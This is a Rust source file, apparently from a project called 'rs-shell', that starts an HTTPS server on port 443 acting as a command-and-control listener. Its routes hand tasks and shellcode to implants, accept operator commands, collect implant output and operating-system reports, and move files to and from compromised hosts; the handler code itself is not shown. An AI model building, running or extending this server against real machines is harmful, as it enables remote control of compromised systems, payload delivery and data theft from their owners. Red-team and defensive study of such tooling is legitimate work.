use actix_multipart::form::tempfile::TempFileConfig;
use actix_web::http::KeepAlive;
use actix_web::{middleware, web, App, HttpServer};
//use actix_multipart::MultipartError;
use std::fs::File;
use std::io::BufReader;

use crate::https::routes::*;

#[actix_web::main]
pub async fn server(i: &str, cert_path: &str, tls_key: &str) -> std::io::Result<()> {
    rustls::crypto::ring::default_provider();

    // Rustls doen't seem to support PKCS12 currently, so we need to use PEM
    let mut certs_file = BufReader::new(File::open(cert_path).unwrap());
    let mut key_file = BufReader::new(File::open(tls_key).unwrap());

    // to create a self-signed temporary cert for testing:
    // `openssl req -x509 -newkey rsa:4096 -nodes -keyout key.pem -out cert.pem -days 365 -subj '/CN=localhost'`
    let tls_certs = rustls_pemfile::certs(&mut certs_file)
        .collect::<Result<Vec<_>, _>>()
        .unwrap();
    let tls_key = rustls_pemfile::pkcs8_private_keys(&mut key_file)
        .next()
        .unwrap()
        .unwrap();

    // set up TLS config options
    let tls_config = rustls::ServerConfig::builder()
        .with_no_client_auth()
        .with_single_cert(tls_certs, rustls::pki_types::PrivateKeyDer::Pkcs8(tls_key))
        .unwrap();

    log::info!("Creating directories and files");
    std::fs::create_dir_all("./downloads")?;
    std::fs::create_dir_all("./tmp")?;
    File::create("next_task.txt")?;

    let port = 443;
    HttpServer::new(|| {
        App::new()
            .wrap(middleware::Logger::default())
            .app_data(TempFileConfig::default().directory("./tmp"))
            /*
                Using routes instead of services with a scope and macros, because file upload with multipart data seems bugged with scopes
                Additionally, it looks like it is only possible to send multipart request to the root of the app, which must be declared as a service with a resource
                If someone knows how to fix this, please let me know
            */
            .service(web::resource("/").route(web::post().to(download)))
            .route("/rs-shell/index", web::get().to(index))
            .route("/rs-shell/next_task", web::get().to(next_task))
            .route(
                "/rs-shell/shellcode{shellcode:.*}",
                web::get().to(shellcode),
            )
            .route("/rs-shell/read_output", web::get().to(read_output))
            .route("/rs-shell/upload{filename:.*}", web::get().to(upload))
            .route("/rs-shell/output_imp", web::post().to(output_imp))
            .route("/rs-shell/operator_cmd", web::post().to(operator_cmd))
            .route("/rs-shell/os", web::post().to(implant_os))
    })
    .bind_rustls_0_22((i, port), tls_config)?
    .keep_alive(KeepAlive::Os)
    .run()
    .await
}
